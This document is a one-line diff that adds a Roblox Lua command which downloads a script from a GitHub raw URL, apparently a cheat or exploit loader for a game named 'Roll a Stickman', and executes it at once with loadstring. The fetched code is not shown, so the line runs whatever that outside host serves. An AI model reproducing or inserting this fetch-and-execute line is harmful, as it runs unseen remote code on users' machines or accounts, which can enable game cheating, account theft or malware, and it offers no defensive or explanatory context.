@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/update-roll-a-stickman-spam0-f9aybgmyhiy2s1.lua"))()
